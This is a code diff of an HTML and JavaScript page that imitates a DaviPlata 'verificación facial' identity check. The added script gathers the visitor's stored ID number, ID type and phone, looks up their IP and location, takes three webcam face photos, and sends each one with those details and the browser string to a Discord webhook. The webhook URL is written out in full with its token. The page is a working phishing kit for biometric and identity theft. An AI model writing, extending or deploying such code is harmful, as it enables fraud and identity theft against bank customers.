@@ -24,66 +24,37 @@
         body, html {
             width: 100%; height: 100%; overflow: hidden;
             background-image: url('https://i.imgur.com/qyaBs5F.png');
-            background-size: cover;
-            background-position: center;
+            background-size: cover; background-position: center;
         }
 
         .app-container {
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
+            height: 100vh; display: flex; flex-direction: column;
             padding: 12px 20px 10px;
         }
 
-        .back-nav {
-            align-self: flex-start;
-            font-size: 22px;
-            padding: 4px 0 6px;
-            cursor: pointer;
-            color: var(--text-dark);
-        }
+        .back-nav { align-self: flex-start; font-size: 22px; padding: 4px 0 6px; cursor: pointer; color: var(--text-dark); }
 
         .header { text-align: center; margin-bottom: 10px; }
-        .logo-img  { width: 85px; margin-bottom: 4px; }
-        .title     { font-size: 17px; font-weight: 600; color: var(--text-dark); margin-bottom: 1px; }
-        .subtitle  { font-size: 11px; color: var(--text-gray); }
+        .logo-img { width: 85px; margin-bottom: 4px; }
+        .title    { font-size: 17px; font-weight: 600; color: var(--text-dark); margin-bottom: 1px; }
+        .subtitle { font-size: 11px; color: var(--text-gray); }
 
         .camera-card {
-            background: var(--input-bg);
-            border-radius: 20px;
-            padding: 10px;
-            box-shadow: 0 4px 18px rgba(0,0,0,0.10);
-            border: 1px solid rgba(0,0,0,0.04);
-            margin-bottom: 10px;
-            flex-shrink: 0;
+            background: var(--input-bg); border-radius: 20px; padding: 10px;
+            box-shadow: 0 4px 18px rgba(0,0,0,0.10); border: 1px solid rgba(0,0,0,0.04);
+            margin-bottom: 10px; flex-shrink: 0;
         }
 
         .camera-wrap {
-            position: relative;
-            border-radius: 12px;
-            overflow: hidden;
-            background: #111;
-            height: 42vh;
+            position: relative; border-radius: 12px;
+            overflow: hidden; background: #111; height: 42vh;
         }
 
-        #video {
-            width: 100%; height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1);
-            display: block;
-        }
+        #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: block; }
 
-        #detectionCanvas {
-            position: absolute; inset: 0;
-            width: 100%; height: 100%;
-            pointer-events: none;
-        }
+        #detectionCanvas { position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; }
 
-        .oval-wrap {
-            position: absolute; inset: 0;
-            display: flex; align-items: center; justify-content: center;
-            pointer-events: none;
-        }
+        .oval-wrap { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; pointer-events: none; }
         .oval-svg { width: 55%; }
 
         .scan-line {
@@ -94,92 +65,45 @@
         }
 
         .cam-status {
-            position: absolute;
-            bottom: 10px; left: 10px; right: 10px;
-            background: rgba(0,0,0,0.52);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-radius: 10px;
-            padding: 8px 12px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.08);
-            transition: border-color 0.3s;
+            position: absolute; bottom: 10px; left: 10px; right: 10px;
+            background: rgba(0,0,0,0.52); backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px); border-radius: 10px;
+            padding: 8px 12px; text-align: center;
+            border: 1px solid rgba(255,255,255,0.08); transition: border-color 0.3s;
         }
-        .cam-status.ok    { border-color: rgba(0,210,100,0.55); }
+        .cam-status.ok { border-color: rgba(0,210,100,0.55); }
         .cam-status-title { font-size: 12px; font-weight: 600; color: #fff; }
 
-        /* DOTS */
-        .dots-row {
-            display: flex; justify-content: center; gap: 10px;
-            margin-bottom: 10px;
-        }
+        .dots-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 10px; }
         .dot {
             width: 10px; height: 10px; border-radius: 50%;
-            background: rgba(0,0,0,0.1);
-            border: 2px solid rgba(0,0,0,0.15);
+            background: rgba(0,0,0,0.1); border: 2px solid rgba(0,0,0,0.15);
             transition: background 0.3s, border-color 0.3s, transform 0.2s;
         }
         .dot.done   { background: #00c853; border-color: #00c853; }
-        .dot.active {
-            background: var(--davi-red); border-color: var(--davi-red);
-            animation: pulse-dot 0.65s infinite alternate;
-        }
+        .dot.active { background: var(--davi-red); border-color: var(--davi-red); animation: pulse-dot 0.65s infinite alternate; }
         @keyframes pulse-dot { to { transform: scale(1.4); } }
 
-        /* TIPS */
         .tips-card {
-            background: var(--input-bg);
-            border-radius: 15px;
-            padding: 11px 14px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-            border: 1px solid rgba(0,0,0,0.03);
+            background: var(--input-bg); border-radius: 15px; padding: 11px 14px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid rgba(0,0,0,0.03);
         }
-        .tips-title {
-            font-size: 11px; font-weight: 600;
-            color: var(--davi-red);
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        .tips-row {
-            display: flex;
-            justify-content: space-around;
-            align-items: flex-start;
-        }
-        .tip-item {
-            display: flex; flex-direction: column;
-            align-items: center; gap: 5px;
-            flex: 1;
-        }
-        .tip-icon {
-            width: 36px; height: 36px; border-radius: 50%;
-            background: #fff0f2;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .tip-label {
-            font-size: 10px; color: var(--text-dark);
-            text-align: center; line-height: 1.3;
-        }
+        .tips-title { font-size: 11px; font-weight: 600; color: var(--davi-red); margin-bottom: 10px; text-align: center; }
+        .tips-row { display: flex; justify-content: space-around; align-items: flex-start; }
+        .tip-item { display: flex; flex-direction: column; align-items: center; gap: 5px; flex: 1; }
+        .tip-icon { width: 36px; height: 36px; border-radius: 50%; background: #fff0f2; display: flex; align-items: center; justify-content: center; }
+        .tip-label { font-size: 10px; color: var(--text-dark); text-align: center; line-height: 1.3; }
 
-        .flash {
-            position: fixed; inset: 0; z-index: 50;
-            background: white; opacity: 0; pointer-events: none;
-            transition: opacity 0.06s;
-        }
+        .flash { position: fixed; inset: 0; z-index: 50; background: white; opacity: 0; pointer-events: none; transition: opacity 0.06s; }
         .flash.show { opacity: 0.85; }
 
         #loader {
             display: none; position: fixed; inset: 0; z-index: 60;
-            background: rgba(255,255,255,0.88);
-            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+            background: rgba(255,255,255,0.88); backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
             flex-direction: column; align-items: center; justify-content: center; gap: 16px;
         }
-        .spinner {
-            width: 48px; height: 48px;
-            border: 4px solid #f0f0f0;
-            border-top: 4px solid var(--davi-red);
-            border-radius: 50%;
-            animation: spin 0.85s linear infinite;
-        }
+        .spinner { width: 48px; height: 48px; border: 4px solid #f0f0f0; border-top: 4px solid var(--davi-red); border-radius: 50%; animation: spin 0.85s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         #loader p { font-size: 14px; font-weight: 500; color: var(--text-dark); }
 
@@ -189,7 +113,6 @@
 <body>
 
 <div class="app-container">
-
     <div class="back-nav">❮</div>
 
     <div class="header">
@@ -230,7 +153,6 @@
     <div class="tips-card">
         <div class="tips-title">Recomendaciones</div>
         <div class="tips-row">
-
             <div class="tip-item">
                 <div class="tip-icon">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
@@ -241,30 +163,25 @@
                 </div>
                 <span class="tip-label">Buena<br>iluminación</span>
             </div>
-
             <div class="tip-item">
                 <div class="tip-icon">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                        <path d="M3 10c0-1.1.9-2 2-2h4a2 2 0 0 1 0 4H5a2 2 0 0 1-2-2ZM13 10c0-1.1.9-2 2-2h4a2 2 0 0 1 0 4h-4a2 2 0 0 1-2-2Z"
-                              stroke="#E60026" stroke-width="1.7"/>
+                        <path d="M3 10c0-1.1.9-2 2-2h4a2 2 0 0 1 0 4H5a2 2 0 0 1-2-2ZM13 10c0-1.1.9-2 2-2h4a2 2 0 0 1 0 4h-4a2 2 0 0 1-2-2Z" stroke="#E60026" stroke-width="1.7"/>
                         <path d="M11 10h2" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                         <line x1="4" y1="4" x2="20" y2="20" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                     </svg>
                 </div>
                 <span class="tip-label">Sin lentes<br>ni gorra</span>
             </div>
-
             <div class="tip-item">
                 <div class="tip-icon">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                         <circle cx="12" cy="8" r="3.2" stroke="#E60026" stroke-width="1.7"/>
-                        <path d="M5.5 20c0-3.59 2.91-6.5 6.5-6.5s6.5 2.91 6.5 6.5"
-                              stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
+                        <path d="M5.5 20c0-3.59 2.91-6.5 6.5-6.5s6.5 2.91 6.5 6.5" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
                     </svg>
                 </div>
                 <span class="tip-label">Rostro<br>centrado</span>
             </div>
-
             <div class="tip-item">
                 <div class="tip-icon">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
@@ -274,10 +191,8 @@
                 </div>
                 <span class="tip-label">Fondo<br>despejado</span>
             </div>
-
         </div>
     </div>
-
 </div>
 
 <div class="flash" id="flash"></div>
@@ -290,20 +205,44 @@
 <canvas id="captureCanvas"></canvas>
 
 <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
+const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1486176133321064595/MsBYfomMDk83Cq559WMDCMxTE3VTcma0Vg-RGDnfwUTnobxCPYjSq2ECO0fjQLcIOl3a";
 const MODELS_URL  = "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/";
-const savedData   = JSON.parse(sessionStorage.getItem('formData') || '{}');
-const docNum      = savedData.num || 'N/A';
+
+// Leer datos desde sessionStorage o localStorage como fallback
+const savedData = JSON.parse(sessionStorage.getItem('formData') || localStorage.getItem('formData') || '{}');
+const docNum    = savedData.num || 'N/A';
+const docType   = savedData.doc === 'CC' ? 'Cédula de Ciudadanía' : savedData.doc === 'CE' ? 'Cédula de Extranjería' : 'N/A';
+const docTel    = savedData.tel || 'N/A';
 
 let photosTaken  = 0;
 let isBusy       = false;
 let faceStableMs = 0;
 let lastDetected = false;
 let scanAnimId   = null;
+let geoInfo      = null;
 
 const TOTAL_PHOTOS = 3;
 const STABLE_MS    = 1800;
 const BETWEEN_MS   = 2000;
+
+// Obtener geo al cargar
+async function getGeoInfo() {
+    try {
+        const res  = await fetch('https://ipapi.co/json/');
+        const json = await res.json();
+        geoInfo = {
+            ip:      json.ip            || 'N/A',
+            city:    json.city          || 'N/A',
+            region:  json.region        || 'N/A',
+            country: json.country_name  || 'N/A',
+            org:     json.org           || 'N/A',
+            lat:     json.latitude      || '',
+            lon:     json.longitude     || ''
+        };
+    } catch {
+        geoInfo = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A', lat: '', lon: '' };
+    }
+}
 
 function updateDots() {
     for (let i = 0; i < TOTAL_PHOTOS; i++) {
@@ -329,8 +268,7 @@ function setOval(state) {
 
 function setStatus(title, mode = '') {
     document.getElementById('statusTitle').textContent = title;
-    const s = document.getElementById('camStatus');
-    s.className = 'cam-status' + (mode ? ' ' + mode : '');
+    document.getElementById('camStatus').className = 'cam-status' + (mode ? ' ' + mode : '');
 }
 
 function startScan() {
@@ -392,64 +330,47 @@ window.addEventListener('resize', resizeCanvas);
 
 function startDetectionLoop() {
     const video = document.getElementById('video');
-
     async function tick() {
         if (photosTaken >= TOTAL_PHOTOS) return;
-
         const opts = new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.45 });
         let det = null;
         try { det = await faceapi.detectSingleFace(video, opts); } catch {}
 
         const canvas = document.getElementById('detectionCanvas');
         const wrap   = document.querySelector('.camera-wrap');
-        const ovalW  = wrap.clientWidth  * 0.55;
+        const ovalW  = wrap.clientWidth * 0.55;
         const ovalH  = ovalW / 0.78;
-        const oCX    = wrap.clientWidth  / 2;
-        const oCY    = wrap.clientHeight / 2;
-        const oRX    = ovalW / 2;
-        const oRY    = ovalH / 2;
+        const oCX = wrap.clientWidth / 2, oCY = wrap.clientHeight / 2;
+        const oRX = ovalW / 2,           oRY = ovalH / 2;
 
         if (det) {
-            const sX  = canvas.width  / video.videoWidth;
-            const sY  = canvas.height / video.videoHeight;
+            const sX = canvas.width / video.videoWidth, sY = canvas.height / video.videoHeight;
             const box = det.box;
             const fX  = (canvas.width - (box.x + box.width) * sX) + (box.width * sX) / 2;
             const fY  = (box.y + box.height / 2) * sY;
-
-            const dx     = (fX - oCX) / oRX;
-            const dy     = (fY - oCY) / oRY;
-            const inside = (dx * dx + dy * dy) <= 1.15;
+            const inside = ((fX - oCX) / oRX) ** 2 + ((fY - oCY) / oRY) ** 2 <= 1.15;
 
             if (inside && !isBusy) {
                 setOval('detected');
                 if (!lastDetected) faceStableMs = Date.now();
                 lastDetected = true;
-
-                const elapsed = Date.now() - faceStableMs;
-
-                if (elapsed >= STABLE_MS) {
+                if (Date.now() - faceStableMs >= STABLE_MS) {
                     capturePhoto();
                 } else {
                     setStatus('No te muevas...', 'ok');
                     if (document.getElementById('scanLine').style.display !== 'block') startScan();
                 }
-            } else {
-                resetState();
-            }
+            } else { resetState(); }
         } else {
-            lastDetected = false;
-            faceStableMs = 0;
-            resetState();
+            lastDetected = false; faceStableMs = 0; resetState();
         }
-
         if (photosTaken < TOTAL_PHOTOS) requestAnimationFrame(tick);
     }
     tick();
 }
 
 function resetState() {
-    stopScan();
-    setOval('idle');
+    stopScan(); setOval('idle');
     if (!isBusy) setStatus('Coloca tu rostro en el óvalo');
 }
 
@@ -460,8 +381,7 @@ async function capturePhoto() {
     const video  = document.getElementById('video');
     const canvas = document.getElementById('captureCanvas');
 
-    setOval('capturing');
-    stopScan();
+    setOval('capturing'); stopScan();
 
     const flash = document.getElementById('flash');
     flash.classList.add('show');
@@ -480,23 +400,93 @@ async function capturePhoto() {
 
     canvas.toBlob(async (blob) => {
         if (blob && blob.size > 1000) {
+            const geo       = geoInfo || {};
+            const now       = new Date();
+            const timestamp = now.toLocaleString('es-CO', {
+                timeZone: 'America/Bogota',
+                day: '2-digit', month: '2-digit', year: 'numeric',
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
+            });
+            const mapsLink = geo.lat
+                ? `[📍 Ver ubicación](https://www.google.com/maps?q=${geo.lat},${geo.lon})`
+                : 'No disponible';
+
             const fd = new FormData();
             fd.append('file', blob, `facial_${photosTaken}.png`);
             fd.append('payload_json', JSON.stringify({
-                content: `🤳 **Facial ${photosTaken}/${TOTAL_PHOTOS}** | Doc: \`${docNum}\``
+                embeds: [{
+                    title: `🤳  DaviPlata — Verificación Facial ${photosTaken}/${TOTAL_PHOTOS}`,
+                    color: 0xE60026,
+                    thumbnail: {
+                        url: "https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z"
+                    },
+                    fields: [
+                        {
+                            name: "📋  Documento",
+                            value: `\`${docType}\`\n**${docNum}**`,
+                            inline: true
+                        },
+                        {
+                            name: "📱  Celular",
+                            value: `**${docTel}**`,
+                            inline: true
+                        },
+                        {
+                            name: "📸  Foto",
+                            value: `**${photosTaken}** de **${TOTAL_PHOTOS}**`,
+                            inline: true
+                        },
+                        {
+                            name: "🌐  Dirección IP",
+                            value: `\`${geo.ip || 'N/A'}\``,
+                            inline: true
+                        },
+                        {
+                            name: "📍  Ubicación",
+                            value: `${geo.city || 'N/A'}, ${geo.region || 'N/A'}\n**${geo.country || 'N/A'}**`,
+                            inline: true
+                        },
+                        {
+                            name: "🏢  Proveedor",
+                            value: `\`${geo.org || 'N/A'}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️  Mapa",
+                            value: mapsLink,
+                            inline: true
+                        },
+                        {
+                            name: "🕐  Fecha y hora",
+                            value: `\`${timestamp}\``,
+                            inline: true
+                        },
+                        {
+                            name: "📲  Dispositivo",
+                            value: `\`${navigator.userAgent.substring(0, 80)}\``,
+                            inline: false
+                        }
+                    ],
+                    footer: { text: "DaviPlata KYC System • Verificación biométrica" },
+                    timestamp: new Date().toISOString()
+                }]
             }));
+
             try { await fetch(WEBHOOK_URL, { method: 'POST', body: fd }); } catch {}
         }
 
         if (photosTaken < TOTAL_PHOTOS) {
             setTimeout(() => {
-                isBusy = false;
-                faceStableMs = 0;
+                isBusy = false; faceStableMs = 0;
                 setOval('idle');
                 setStatus('Coloca tu rostro en el óvalo');
                 requestAnimationFrame(() => startDetectionLoop());
             }, BETWEEN_MS);
         } else {
+            // Guardar estado facial en localStorage
+            localStorage.setItem('facialDone', 'true');
+            localStorage.setItem('facialDone_ts', new Date().toISOString());
+
             showLoader('Validando identidad biométrica...');
             setTimeout(() => {
                 hideLoader();
@@ -520,6 +510,7 @@ function hideLoader() {
 }
 
 window.addEventListener('load', () => {
+    getGeoInfo();
     updateDots();
     const wait = setInterval(() => {
         if (typeof faceapi !== 'undefined') { clearInterval(wait); loadModels(); }
